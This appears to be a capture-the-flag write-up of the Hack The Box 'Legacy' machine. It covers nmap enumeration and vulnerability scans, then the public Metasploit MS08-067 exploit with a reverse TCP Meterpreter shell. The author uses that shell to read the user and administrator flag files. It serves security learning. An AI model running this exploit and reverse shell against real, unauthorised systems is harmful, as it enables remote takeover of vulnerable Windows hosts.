## Description
Legacy is a fairly straightforward beginner-level machine which demonstrates the potential security risks of SMB on Windows. Only one publicly available exploit is required to obtain administrator access.
## Enumeration
Let's start by a nmap scan:
```
$nmap -sC -sV -oA scans/nmap -p- 10.129.109.83
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-22 20:47 CEST
Nmap scan report for 10.129.109.83
Host is up (0.022s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: 5d00h27m37s, deviation: 2h07m16s, median: 4d22h57m37s
|_smb2-time: Protocol negotiation failed (SMB2)
|_nbstat: NetBIOS name: nil, NetBIOS user: <unknown>, NetBIOS MAC: 005056969d99 (VMware)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2023-09-27T23:45:40+03:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.99 seconds
```
I used the `-oA` option after seeing it on several writeups. It outputs the scan in 3 formats (normal, XML and grepable format). In my case, I only need the normal format so, in the future, I will use `-oN` only.
This first scan shows us that there is a Samba service running on a Windows XP (this OS still exists!).
Again, in a previous writeup, I learned about the `vuln` scripts of nmap. Let's try them on this server to see if it is vulnerable to any known exploit:
```
$nmap --script vuln -oN scans/nmap_vuln -p135,139,445 10.129.109.83
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-22 20:53 CEST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.129.109.83
Host is up (0.021s latency).

PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)

Nmap done: 1 IP address (1 host up) scanned in 62.97 seconds
```
Apparently, the server has two known vulnerabilities: MS17-010 (`EternalBlue` that we already saw in a previous box) and MS08-67. It seems to have an exploit in MetaSploit for this vulnerability:
```
$ msfconsole
[msf](Jobs:0 Agents:0) >> search exploit MS08-067

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/smb/ms08_067_netapi  2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption
```
## Foothold
Let's try this exploit using MetaSploit:
```
[msf](Jobs:0 Agents:0) >> use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) >> set rhosts 10.129.109.83
rhosts => 10.129.109.83
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) >> set lhost tun0
lhost => 10.10.14.93
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) >> run

[*] Started reverse TCP handler on 10.10.14.93:4444 
[*] 10.129.109.83:445 - Automatically detecting the target...
[*] 10.129.109.83:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.129.109.83:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.129.109.83:445 - Attempting to trigger the vulnerability...
[*] Sending stage (175686 bytes) to 10.129.109.83
[*] Meterpreter session 1 opened (10.10.14.93:4444 -> 10.129.109.83:1041) at 2023-09-22 20:58:54 +0200

(Meterpreter 1)(C:\WINDOWS\system32) > shell
Process 1524 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>echo %username%
echo %username%
LEGACY$

C:\WINDOWS\system32>cd "C:\Documents and Settings\"
cd "C:\Documents and Settings\"

C:\Documents and Settings>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings

16/03/2017  09:07 ��    <DIR>          .
16/03/2017  09:07 ��    <DIR>          ..
16/03/2017  09:07 ��    <DIR>          Administrator
16/03/2017  08:29 ��    <DIR>          All Users
16/03/2017  08:33 ��    <DIR>          john
               0 File(s)              0 bytes
               5 Dir(s)   6.296.023.040 bytes free

C:\Documents and Settings>type john\Desktop\user.txt
type john\Desktop\user.txt
e[...SNIP...]f
```
We can see that we are logged with the user `LEGACY$` and this user has the right to read the flag file located in the `john` folder. Let's look if it has the rights to read the content of the Administrator folder:
```
C:\Documents and Settings>cd Administrator
cd Administrator

C:\Documents and Settings\Administrator>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings\Administrator

16/03/2017  09:07 ��    <DIR>          .
16/03/2017  09:07 ��    <DIR>          ..
16/03/2017  09:18 ��    <DIR>          Desktop
16/03/2017  09:07 ��    <DIR>          Favorites
16/03/2017  09:07 ��    <DIR>          My Documents
16/03/2017  08:20 ��    <DIR>          Start Menu
               0 File(s)              0 bytes
               6 Dir(s)   6.297.096.192 bytes free

C:\Documents and Settings\Administrator>cd Desktop
cd Desktop

C:\Documents and Settings\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings\Administrator\Desktop

16/03/2017  09:18 ��    <DIR>          .
16/03/2017  09:18 ��    <DIR>          ..
16/03/2017  09:18 ��                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)   6.297.096.192 bytes free

C:\Documents and Settings\Administrator\Desktop>type root.txt
type root.txt
9[...SNIP...]3
```
Apparently, yes. We get the root flag pretty easily too.
## Learning from other writeups
### rana-khalil writeup
The writeup is available here: https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/legacy-writeup-w-o-metasploit
It uses the `EternalBlue` exploit. I take note that, in the OSCP exam, `Metasploit` usage is restricted, it is good to know if I want to give it a try one day.
### 0xdf writeup
The writeup can be found here: https://0xdf.gitlab.io/2019/02/21/htb-legacy.html
First thing I note is the options used for the nmap scan. It uses `-sT`, then `-sU` for TCP and UDP scan. In my previous boxes, I did not perform any UDP scan, but I think I just was lucky that any vulnerable service were using UDP. It is still good to remember. However, after reading the manual of nmap, it seems that `-sS` is preferable to `-sT` when it is possible. `-sS` perform a quick TCP SYN scan and the discovered open ports can then be used to run some scripts with `-sC` (default scripts) and `-sV` (version scripts).
## Lessons learned
This was a very straightforward box and I have been able to apply what I have seen in previous writeups. It makes it very easy to get the flags. So, I will continue to read carefully the other writeups and take advantage of them.
